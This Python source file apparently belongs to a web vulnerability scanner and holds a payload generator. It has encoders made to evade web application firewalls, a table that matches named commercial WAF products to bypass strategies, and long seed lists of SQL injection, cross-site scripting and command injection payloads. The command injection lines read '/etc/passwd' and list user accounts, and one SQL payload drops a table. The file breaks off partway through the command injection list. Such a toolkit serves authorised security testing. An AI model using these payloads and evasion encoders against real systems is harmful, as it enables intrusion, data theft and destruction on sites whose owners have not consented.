import glob as _glob
import os
import random
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

try:
    import yaml as _yaml
    _HAS_YAML = True
except ImportError:
    _HAS_YAML = False

_YAML_OVERRIDES_CACHE = None


def _load_yaml_overrides() -> dict:
    """Load payload_seeds/*.yml once and cache the merged dict.

    (The previous implementation returned {} after the first call, so YAML
    seeds only ever applied to the very first generate() in the process.)
    """
    global _YAML_OVERRIDES_CACHE
    if _YAML_OVERRIDES_CACHE is not None:
        return _YAML_OVERRIDES_CACHE
    overrides = {}
    base = os.path.join(os.path.dirname(__file__) or ".", "..", "payload_seeds")
    if os.path.isdir(base) and _HAS_YAML:
        for fpath in _glob.glob(os.path.join(base, "*.yml")):
            try:
                with open(fpath, "r", encoding="utf-8") as f:
                    data = _yaml.safe_load(f)
                if not isinstance(data, dict):
                    continue
                seeds = data.get("seeds", {})
                for group_name, group_data in seeds.items():
                    if group_name not in overrides:
                        overrides[group_name] = {}
                    for key_name, entries in group_data.items():
                        if not isinstance(entries, list):
                            continue
                        filtered = []
                        for e in entries:
                            if isinstance(e, dict) and "raw" in e:
                                if "ctx" not in e:
                                    e["ctx"] = ["all"]
                                filtered.append(e)
                        if filtered:
                            overrides[group_name].setdefault(key_name, [])
                            overrides[group_name][key_name] = (
                                overrides[group_name][key_name] + filtered
                            )
            except Exception:
                pass
    _YAML_OVERRIDES_CACHE = overrides
    return overrides


def _sql_case_mix(raw: str) -> str:
    sql_kw = {
        "OR", "AND", "SELECT", "UNION", "FROM", "WHERE", "ORDER", "BY",
        "SLEEP", "WAITFOR", "DELAY", "INSERT", "UPDATE", "DELETE", "DROP",
        "CREATE", "ALTER", "EXEC", "HAVING", "GROUP", "NULL", "NOT",
        "INTO", "VALUES", "SET", "LIKE", "ADMIN", "ALL", "DISTINCT",
        "PG_SLEEP", "IF", "SUBSTRING", "USER", "DATABASE", "TABLE",
        "COLUMN", "SCHEMA", "BENCHMARK", "LOAD_FILE", "INTOOUTFILE",
        "INFORMATION_SCHEMA", "ON", "AS", "ELT", "EXTRACTVALUE",
        "UPDATEXML", "DECODE", "CHR", "CONCAT", "CONCAT_WS", "CAST",
        "CONVERT", "EXISTS", "RAND", "REVERSE", "MID",
        "BIN", "HEX", "UNHEX", "CHAR", "ORD", "ASCII", "LENGTH",
    }
    result = []
    for word in raw.split(" "):
        stripped = word.strip("'\"();\n\t")
        if stripped.upper() in sql_kw:
            mutated = "".join(random.choice([c.upper(), c.lower()]) for c in word)
            result.append(mutated)
        else:
            result.append(word)
    return " ".join(result)


def _sql_comment(raw: str) -> str:
    r = raw
    r = r.replace(" OR ", " /**/OR/**/ ")
    r = r.replace(" AND ", " /**/AND/**/ ")
    r = r.replace("SELECT", "SEL/**/ECT")
    r = r.replace("UNION", "UN/**/ION")
    r = r.replace(" WHERE ", " /**/WHERE/**/ ")
    r = r.replace(" FROM ", " /**/FROM/**/ ")
    r = r.replace(" ORDER ", " /**/ORDER/**/ ")
    r = r.replace("SLEEP", "SLE/**/EP")
    r = r.replace("PG_SLEEP", "PG_SLE/**/EP")
    r = r.replace("WAITFOR", "WAI/**/TFOR")
    r = r.replace("DELAY", "DE/**/LAY")
    r = r.replace("BENCHMARK", "BEN/**/CHMARK")
    r = r.replace("UPDATEXML", "UP/**/DATEXML")
    r = r.replace("EXTRACTVALUE", "EXT/**/RACTVALUE")
    return r


def _sql_whitespace(raw: str) -> list:
    variants = []
    for repl in ("\t", "\n", "\r", "\f", "\xa0", "+"):
        variants.append(raw.replace(" ", repl))
    return variants


def _html_entity(raw: str) -> str:
    out = []
    for c in raw:
        if c == "'":
            out.append("&#39;")
        elif c == '"':
            out.append("&#34;")
        elif c == "=":
            out.append("&#61;")
        elif c == "<":
            out.append("&lt;")
        elif c == ">":
            out.append("&gt;")
        else:
            out.append(c)
    return "".join(out)


def _hex_quote(raw: str) -> str:
    return raw.replace("'", "%27").replace('"', "%22")


def _wide_byte(raw: str) -> str:
    return raw.replace("'", "%bf%27").replace('"', "%bf%22")


def _unicode_escape(raw: str) -> str:
    out = []
    for c in raw:
        if c == "'":
            out.append("%u0027")
        elif c == '"':
            out.append("%u0022")
        elif c == "/":
            out.append("%u2215")
        elif c == "\\":
            out.append("%u2216")
        else:
            out.append(c)
    return "".join(out)


def _tab_sep(raw: str) -> str:
    return raw.replace(" ", "\t")


def _crlf_sep(raw: str) -> str:
    return raw.replace(" ", "%0d%0a")


def _concat_sql(raw: str) -> str:
    r = raw
    r = r.replace("SELECT", "CONCAT('SEL','ECT')")
    r = r.replace("UNION", "CONCAT('UNI','ON')")
    r = r.replace("FROM", "CONCAT('FR','OM')")
    r = r.replace("WHERE", "CONCAT('WH','ERE')")
    r = r.replace("AND", "CONCAT('A','ND')")
    r = r.replace("OR", "CONCAT('O','R')")
    return r


def _url_partial(raw: str) -> str:
    return urllib.parse.quote(
        raw,
        safe="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-.~",
    )


_VERSIONED_KEYWORDS = ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND",
                       "SLEEP", "ORDER", "BY", "HAVING", "GROUP", "NULL",
                       "INSERT", "UPDATE", "DELETE", "INTO", "VALUES")


def _versioned_comment(raw: str) -> str:
    """MySQL versioned comments /*!50000SELECT*/ - executed by MySQL,
    invisible to most WAF signature engines."""
    out = raw
    for kw in _VERSIONED_KEYWORDS:
        out = re.sub(r"\b%s\b" % kw, "/*!50000%s*/" % kw, out)
    return out


def _hex_str(raw: str) -> str:
    """Convert simple 'literal' string constants to MySQL 0x... hex literals.

    Only converts clean literals (alnum/underscore/dash); anything containing
    spaces, quotes or SQL operators is left untouched so payloads stay valid.
    """
    def _conv(m):
        inner = m.group(1)
        if not inner or re.search(r"[^A-Za-z0-9_@.\-]", inner):
            return m.group(0)
        return "0x%s" % inner.encode("utf-8").hex()

    return re.sub(r"'([^']*)'", _conv, raw)


ENCODERS = {
    "url": lambda s: urllib.parse.quote(s, safe=""),
    "double_url": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
    "hex_chars": lambda s: "".join("%%%02x" % ord(c) if c in "'\"= " else c for c in s),
    "null_prefix": lambda s: "%00" + s,
    "case_sql": _sql_case_mix,
    "comment_sql": _sql_comment,
    "whitespace_sql": _sql_whitespace,
    "scientific": lambda s: s.replace("1=1", "1.0=1.0").replace("1=2", "1.0=2.0"),
    "html_entity": _html_entity,
    "hex_quote": _hex_quote,
    "wide_byte": _wide_byte,
    "unicode_escape": _unicode_escape,
    "tab_sep": _tab_sep,
    "crlf_sep": _crlf_sep,
    "concat_sql": _concat_sql,
    "url_partial": _url_partial,
    "versioned_comment": _versioned_comment,
    "hex_str": _hex_str,
}

WAF_STRATEGIES: Dict[Optional[str], Dict] = {
    "cloudflare": {
        "priority": ["case_sql", "comment_sql", "whitespace_sql", "url_partial", "html_entity"],
        "skip": [],
    },
    "mod_security": {
        "priority": ["whitespace_sql", "scientific", "null_prefix", "tab_sep", "hex_quote"],
        "skip": [],
    },
    "aws_waf": {
        "priority": ["double_url", "case_sql", "url_partial", "html_entity"],
        "skip": [],
    },
    "imperva": {
        "priority": ["hex_chars", "case_sql", "whitespace_sql", "unicode_escape"],
        "skip": [],
    },
    "akamai": {
        "priority": ["case_sql", "comment_sql", "whitespace_sql", "tab_sep", "url_partial"],
        "skip": [],
    },
    "f5_bigip": {
        "priority": ["case_sql", "comment_sql", "whitespace_sql", "hex_quote", "crlf_sep"],
        "skip": [],
    },
    "barracuda": {
        "priority": ["whitespace_sql", "hex_chars", "null_prefix", "case_sql"],
        "skip": [],
    },
    "sucuri": {
        "priority": ["url_partial", "case_sql", "comment_sql", "whitespace_sql"],
        "skip": [],
    },
    "wordfence": {
        "priority": ["case_sql", "comment_sql", "whitespace_sql", "url_partial", "html_entity"],
        "skip": [],
    },
    "citrix_netscaler": {
        "priority": ["whitespace_sql", "hex_chars", "case_sql", "url_partial"],
        "skip": [],
    },
    "comodo_waf": {
        "priority": ["comment_sql", "case_sql", "whitespace_sql", "null_prefix"],
        "skip": [],
    },
    "fortiweb": {
        "priority": ["case_sql", "whitespace_sql", "hex_quote", "tab_sep"],
        "skip": [],
    },
    "radware": {
        "priority": ["case_sql", "comment_sql", "hex_chars", "url_partial"],
        "skip": [],
    },
    "yuan_security": {
        "priority": ["case_sql", "comment_sql", "whitespace_sql", "url_partial"],
        "skip": [],
    },
    None: {
        "priority": ["case_sql", "comment_sql", "whitespace_sql", "hex_chars", "scientific"],
        "skip": [],
    },
}

SQLI_SEEDS: Dict[str, List[dict]] = {
    "error": [
        {"raw": "'", "ctx": ["string"]},
        {"raw": '"', "ctx": ["string"]},
        {"raw": "')", "ctx": ["string"]},
        {"raw": "'))", "ctx": ["string"]},
        {"raw": "\\'", "ctx": ["string"]},
        {"raw": "`", "ctx": ["string"]},
        {"raw": "' OR '1'='1", "ctx": ["string"]},
        {"raw": "' OR 1=1-- ", "ctx": ["string", "numeric"]},
        {"raw": "' OR 1=1#", "ctx": ["string"]},
        {"raw": "' OR 1=1/*", "ctx": ["string"]},
        {"raw": "'; SELECT 1-- ", "ctx": ["string"]},
        {"raw": "1' OR '1'='1", "ctx": ["numeric"]},
        {"raw": "1' OR 1=1-- ", "ctx": ["numeric"]},
        {"raw": "' UNION SELECT 1-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT 1,2-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT 1,2,3-- ", "ctx": ["string"]},
        {"raw": '" OR "1"="1', "ctx": ["string"]},
        {"raw": '" OR 1=1-- ', "ctx": ["string"]},
        {"raw": '1" OR "1"="1', "ctx": ["numeric"]},
        {"raw": "' AND '1'='1", "ctx": ["string"]},
        {"raw": "1 AND 1=1", "ctx": ["numeric"]},
        {"raw": "1 AND 1=2", "ctx": ["numeric"]},
        {"raw": "' OR 1=1-- -", "ctx": ["string"]},
        {"raw": "' OR 1=1 LIMIT 1-- ", "ctx": ["string"]},
        {"raw": "' OR '1'='1'-- ", "ctx": ["string"]},
        {"raw": "1; SELECT 1", "ctx": ["numeric"]},
        {"raw": "1' ORDER BY 100-- ", "ctx": ["numeric"]},
        {"raw": "1' GROUP BY 1,2,3,4-- ", "ctx": ["numeric"]},
        {"raw": "1' HAVING 1=1-- ", "ctx": ["numeric"]},
        {"raw": "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- ", "ctx": ["string"]},
        {"raw": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- ", "ctx": ["string"]},
    ],
    "boolean_true": [
        {"raw": "' AND '1'='1", "ctx": ["string"]},
        {"raw": "' AND 1=1-- ", "ctx": ["string"]},
        {"raw": '" AND "1"="1', "ctx": ["string"]},
        {"raw": '") AND 1=1-- ', "ctx": ["string"]},
        {"raw": "' OR NOT 1=0-- ", "ctx": ["string"]},
        {"raw": "1 AND 1=1", "ctx": ["numeric"]},
        {"raw": "1 AND 1=1-- ", "ctx": ["numeric"]},
        {"raw": "1' AND '1'='1", "ctx": ["numeric"]},
        {"raw": "1' OR '1'='1' -- ", "ctx": ["numeric"]},
        {"raw": "' OR '1'='1' -- ", "ctx": ["string"]},
        {"raw": "'||'1'='1", "ctx": ["string"]},
        {"raw": "1||1", "ctx": ["numeric"]},
        {"raw": "' AND 1=1#", "ctx": ["string"]},
        {"raw": "' AND 1=1/*", "ctx": ["string"]},
        {"raw": "1 AND 1=1 AND 1=1-- ", "ctx": ["numeric"]},
    ],
    "boolean_false": [
        {"raw": "' AND '1'='2", "ctx": ["string"]},
        {"raw": "' AND 1=2-- ", "ctx": ["string"]},
        {"raw": '" AND "1"="2', "ctx": ["string"]},
        {"raw": '") AND 1=2-- ', "ctx": ["string"]},
        {"raw": "' OR NOT 1=1-- ", "ctx": ["string"]},
        {"raw": "1 AND 1=2", "ctx": ["numeric"]},
        {"raw": "1 AND 1=2-- ", "ctx": ["numeric"]},
        {"raw": "1' AND '1'='2", "ctx": ["numeric"]},
        {"raw": "1' OR '1'='2' -- ", "ctx": ["numeric"]},
        {"raw": "' OR '1'='2' -- ", "ctx": ["string"]},
        {"raw": "'||'1'='2", "ctx": ["string"]},
        {"raw": "1||2", "ctx": ["numeric"]},
        {"raw": "' AND 1=2#", "ctx": ["string"]},
        {"raw": "' AND 1=2/*", "ctx": ["string"]},
        {"raw": "1 AND 1=2 AND 1=1-- ", "ctx": ["numeric"]},
    ],
    "time_mysql": [
        {"raw": "' OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' OR SLEEP(2)-- ", "dbms": "MySQL"},
        {"raw": "' AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "1' AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' OR 1=1 AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "') OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "') AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "1' OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' OR 1=1 OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' UNION SELECT SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "1 AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' AND SLEEP(3)#", "dbms": "MySQL"},
        {"raw": "' AND SLEEP(3)/*", "dbms": "MySQL"},
        {"raw": "1' AND (SELECT SLEEP(3))-- ", "dbms": "MySQL"},
        {"raw": "' OR BENCHMARK(3000000,MD5(1))-- ", "dbms": "MySQL"},
        {"raw": "' AND BENCHMARK(5000000,MD5('a'))-- ", "dbms": "MySQL"},
    ],
    "time_mssql": [
        {"raw": "' WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
        {"raw": "'; WAITFOR DELAY '0:0:2'-- ", "dbms": "MSSQL"},
        {"raw": "' OR 1=1; WAITFOR DELAY '0:0:2'-- ", "dbms": "MSSQL"},
        {"raw": "1'; WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
        {"raw": '" WAITFOR DELAY \'0:0:3\'-- ', "dbms": "MSSQL"},
        {"raw": "1; WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
        {"raw": "'; WAITFOR DELAY '0:0:3'-- -", "dbms": "MSSQL"},
        {"raw": "1'; IF 1=1 WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
    ],
    "time_postgres": [
        {"raw": "' OR pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "') OR pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "'; SELECT pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "1' OR pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "' OR 1=1; SELECT pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "1; SELECT pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "'; SELECT pg_sleep(3);-- ", "dbms": "PostgreSQL"},
    ],
    "time_oracle": [
        {"raw": "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- ", "dbms": "Oracle"},
        {"raw": "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- ", "dbms": "Oracle"},
        {"raw": "' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- ", "dbms": "Oracle"},
        {"raw": "'; DBMS_LOCK.SLEEP(3)-- ", "dbms": "Oracle"},
        {"raw": "1; DBMS_LOCK.SLEEP(3)-- ", "dbms": "Oracle"},
        {"raw": "' AND 1=1 AND DBMS_LOCK.SLEEP(3)-- ", "dbms": "Oracle"},
    ],
    "time_sqlite": [
        {"raw": "' AND 1=1 AND randomblob(500000000)-- ", "dbms": "SQLite"},
        {"raw": "1' AND randomblob(500000000)-- ", "dbms": "SQLite"},
        {"raw": "' AND 1=1 AND (SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))-- ", "dbms": "SQLite"},
        {"raw": "1 AND randomblob(500000000)-- ", "dbms": "SQLite"},
    ],
    "time_generic": [
        {"raw": "' OR 1=1 OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "admin' OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "1' OR '1'='1' OR SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "' OR '1'='1' AND SLEEP(3)-- ", "dbms": "MySQL"},
        {"raw": "'; SELECT pg_sleep(3)-- ", "dbms": "PostgreSQL"},
        {"raw": "' WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
    ],
    "union": [
        {"raw": "' UNION SELECT NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "') UNION SELECT NULL-- ", "ctx": ["string"]},
        {"raw": "') UNION SELECT NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "') UNION SELECT NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": "') UNION SELECT NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
        {"raw": '") UNION SELECT NULL-- ', "ctx": ["string"]},
        {"raw": '") UNION SELECT NULL,NULL-- ', "ctx": ["string"]},
        {"raw": "UNION SELECT NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "1 UNION SELECT NULL-- ", "ctx": ["numeric"]},
        {"raw": "1 UNION SELECT NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "1 UNION SELECT NULL,NULL,NULL-- ", "ctx": ["numeric"]},
        {"raw": "1 UNION SELECT NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
    ],
    "stacked": [
        {"raw": "'; SELECT 1-- ", "ctx": ["string"]},
        {"raw": "'; SELECT 1;-- ", "ctx": ["string"]},
        {"raw": '"; SELECT 1-- ', "ctx": ["string"]},
        {"raw": "1; SELECT 1-- ", "ctx": ["numeric"]},
        {"raw": "1'; SELECT 1-- ", "ctx": ["numeric"]},
        {"raw": "'; DROP TABLE IF EXISTS x-- ", "ctx": ["string"]},
        {"raw": "'; SELECT SLEEP(0)-- ", "ctx": ["string"]},
        {"raw": "'; SELECT pg_sleep(0)-- ", "ctx": ["string"]},
        {"raw": "1; SELECT SLEEP(0)-- ", "ctx": ["numeric"]},
        {"raw": "'; WAITFOR DELAY '0:0:0'-- ", "ctx": ["string"]},
    ],
    "conditional": [
        {"raw": "' AND IF(1=1,1,0)-- ", "dbms": "MySQL", "ctx": ["string"]},
        {"raw": "1 AND IF(1=1,1,0)-- ", "dbms": "MySQL", "ctx": ["numeric"]},
        {"raw": "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- ", "dbms": "MSSQL", "ctx": ["string"]},
        {"raw": "' AND 1=(SELECT 1)-- ", "ctx": ["string"]},
        {"raw": "1 AND 1=(SELECT 1)-- ", "ctx": ["numeric"]},
        {"raw": "' AND 1=(SELECT 2)-- ", "ctx": ["string"]},
    ],
}

XSS_SEEDS: Dict[str, List[dict]] = {
    "html": [
        {"raw": "<script>alert(1)</script>", "ctx": ["all"]},
        {"raw": "<script>alert(document.domain)</script>", "ctx": ["all"]},
        {"raw": "<img src=x onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "<img src=x onerror=alert(document.domain)>", "ctx": ["all"]},
        {"raw": "<svg onload=alert(1)>", "ctx": ["all"]},
        {"raw": "<body onload=alert(1)>", "ctx": ["all"]},
        {"raw": "<input autofocus onfocus=alert(1)>", "ctx": ["all"]},
        {"raw": "<details open ontoggle=alert(1)>", "ctx": ["all"]},
        {"raw": "<marquee onstart=alert(1)>", "ctx": ["all"]},
        {"raw": "<video onloadstart=alert(1) src=x>", "ctx": ["all"]},
        {"raw": "<audio onloadstart=alert(1) src=x>", "ctx": ["all"]},
        {"raw": "<select autofocus onfocus=alert(1)>", "ctx": ["all"]},
        {"raw": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "<div><div><img src=x onerror=alert(1)></div></div>", "ctx": ["all"]},
        {"raw": "<a href=javascript:alert(1)>x</a>", "ctx": ["all"]},
        {"raw": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "ctx": ["all"]},
        {"raw": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "<svg><script>alert(1)</script></svg>", "ctx": ["all"]},
        {"raw": "<template><img src=x onerror=alert(1)></template>", "ctx": ["all"]},
        {"raw": "<object data='javascript:alert(1)'>", "ctx": ["all"]},
        {"raw": "<embed src='javascript:alert(1)'>", "ctx": ["all"]},
        {"raw": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "ctx": ["all"]},
        {"raw": "<svg><set attributeName=onmouseover onbegin=alert(1)>", "ctx": ["all"]},
        {"raw": "<math><annotation-xml encoding='text/html'><img src=x onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "<xss id=x onfocus=alert(1) tabindex=1>#x</xss>", "ctx": ["all"]},
        {"raw": "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>", "ctx": ["all"]},
        {"raw": "<video><source onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "<iframe srcdoc='<svg onload=alert(1)>'></iframe>", "ctx": ["all"]},
        {"raw": "<svg onload=alert(1)//", "ctx": ["all"]},
    ],
    "attr": [
        {"raw": '" onfocus=alert(1) autofocus="', "ctx": ["all"]},
        {"raw": "' onfocus=alert(1) autofocus='", "ctx": ["all"]},
        {"raw": '" autofocus onfocus=alert(1)', "ctx": ["all"]},
        {"raw": "' autofocus onfocus=alert(1)", "ctx": ["all"]},
        {"raw": '" onmouseover=alert(1) "', "ctx": ["all"]},
        {"raw": '" onclick=alert(1) "', "ctx": ["all"]},
        {"raw": '" onfocus=alert(1) x="', "ctx": ["all"]},
        {"raw": '" onload=alert(1) "', "ctx": ["all"]},
        {"raw": '" onerror=alert(1) "', "ctx": ["all"]},
        {"raw": "javascript:alert(1)", "ctx": ["all"]},
        {"raw": "' accesskey='x' onclick='alert(1)", "ctx": ["all"]},
        {"raw": '" onmouseover="alert(1)" x="', "ctx": ["all"]},
        {"raw": '" oninput="alert(1)" autofocus x="', "ctx": ["all"]},
        {"raw": "' oninput='alert(1)' autofocus x='", "ctx": ["all"]},
        {"raw": '" onpointerenter="alert(1)" x="', "ctx": ["all"]},
        {"raw": '" onanimationstart="alert(1)" x="', "ctx": ["all"]},
        {"raw": '" autofocus onfocus=alert(1)//', "ctx": ["all"]},
        {"raw": "' autofocus onfocus=alert(1)//", "ctx": ["all"]},
        {"raw": "&Tab;onfocus=alert(1) autofocus", "ctx": ["all"]},
        {"raw": "jav&#x61;script:alert(1)", "ctx": ["all"]},
        {"raw": "&#106;avascript:alert(1)", "ctx": ["all"]},
    ],
    "js": [
        {"raw": "';alert(1)//", "ctx": ["all"]},
        {"raw": '";alert(1)//', "ctx": ["all"]},
        {"raw": "</script><script>alert(1)</script>", "ctx": ["all"]},
        {"raw": "\\';alert(1);//", "ctx": ["all"]},
        {"raw": "';document.body.innerHTML='<img src=x onerror=alert(1)>';//", "ctx": ["all"]},
        {"raw": "';var a=alert;a(1);//", "ctx": ["all"]},
        {"raw": "1;alert(1)//", "ctx": ["all"]},
        {"raw": "};alert(1);//", "ctx": ["all"]},
        {"raw": "${alert(1)}", "ctx": ["all"]},
        {"raw": "`;alert(1);//", "ctx": ["all"]},
        {"raw": "';top['al'%2b'ert'](1);//", "ctx": ["all"]},
        {"raw": "';self['alert'](1);//", "ctx": ["all"]},
        {"raw": "';new Function('alert(1)')();//", "ctx": ["all"]},
        {"raw": "';eval(atob('YWxlcnQoMSk='));//", "ctx": ["all"]},
        {"raw": "';fetch('/');//", "ctx": ["all"]},
        {"raw": "';import('data:text/javascript,alert(1)');//", "ctx": ["all"]},
        {"raw": "</script><svg onload=alert(1)>", "ctx": ["all"]},
        {"raw": "';throw 1;//", "ctx": ["all"]},
        {"raw": "\\x27;alert(1);//", "ctx": ["all"]},
    ],
    "angular": [
        {"raw": "{{constructor.constructor('alert(1)')()}}", "ctx": ["all"]},
        {"raw": "{{$on.constructor('alert(1)')()}}", "ctx": ["all"]},
        {"raw": "{{a='constructor';b='alert(1)';constructor[a](b)()}}", "ctx": ["all"]},
        {"raw": "{{_=''.constructor;_='alert(1)';constructor.constructor(_)()}}", "ctx": ["all"]},
        {"raw": "{{[].constructor.constructor('alert(1)')()}}", "ctx": ["all"]},
        {"raw": "{{'a'.constructor.constructor('alert(1)')()}}", "ctx": ["all"]},
        {"raw": "{{$eval.constructor('alert(1)')()}}", "ctx": ["all"]},
        {"raw": "{{constructor.constructor('eval(atob(\\'YWxlcnQoMSk=\\'))')()}}", "ctx": ["all"]},
        {"raw": "{{x=['a'];x.constructor.constructor('alert(1)')()}}", "ctx": ["all"]},
    ],
    "json": [
        {"raw": '"-alert(1)-"', "ctx": ["all"]},
        {"raw": "';alert(1);//", "ctx": ["all"]},
        {"raw": "\\';alert(1);//", "ctx": ["all"]},
        {"raw": "</script><script>alert(1)</script>", "ctx": ["all"]},
        {"raw": "\\u0027-alert(1)-\\u0027", "ctx": ["all"]},
        {"raw": "{{constructor.constructor('alert(1)')()}}", "ctx": ["all"]},
    ],
    "comment": [
        {"raw": "--> <svg onload=alert(1)>", "ctx": ["all"]},
        {"raw": "--><script>alert(1)</script>", "ctx": ["all"]},
        {"raw": "// --><img src=x onerror=alert(1)>", "ctx": ["all"]},
        {"raw": "/*</script><script>alert(1)</script>*/", "ctx": ["all"]},
        {"raw": "<!--><img src=x onerror=alert(1)>", "ctx": ["all"]},
    ],
}

CMDI_SEEDS: Dict[str, List[dict]] = {
    "output": [
        {"raw": "; id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "| id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "` id`", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "$(id)", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "; whoami", "indicator": None, "ctx": ["all"]},
        {"raw": "| whoami", "indicator": None, "ctx": ["all"]},
        {"raw": "\n id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "'; id;'", "indicator": "uid=", "ctx": ["all"]},
        {"raw": '"; id;"', "indicator": "uid=", "ctx": ["all"]},
        {"raw": "& id &", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "&& id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "|| id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "; cat /etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "| cat /etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "; echo test123", "indicator": "test123", "ctx": ["all"]},
        {"raw": "; pwd", "indicator": "/", "ctx": ["all"]},
        {"raw": "| dir", "indicator": "Directory:", "ctx": ["all"]},
        {"raw": "; uname -a", "indicator": "Linux", "ctx": ["all"]},
        {"raw": "| uname -a", "indicator": "Linux", "ctx": ["all"]},
        {"raw": "; hostname", "indicator": None, "ctx": ["all"]},
        {"raw": "| hostname", "indicator": None, "ctx": ["all"]},
        {"raw": "; cat /etc/hosts", "indicator": "localhost", "ctx": ["all"]},
        {"raw": "; type C:\\\\Windows\\\\win.ini", "indicator": "[fonts]", "ctx": ["all"]},
        {"raw": "& ver &", "indicator": "Windows", "ctx": ["all"]},
        {"raw": "| ver", "indicator": "Windows", "ctx": ["all"]},
        {"raw": "; net user", "indicator": "User accounts", "ctx": ["all"]},
        {"raw": "| net user", "indicator": "User accounts", "ctx": ["all"]},
        {"raw": "%0a id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "%0a whoami", "indicator": None, "ctx": ["all"]},
        {"raw": "; id; echo DONE_7341", "indicator": "DONE_", "ctx": ["all"]},
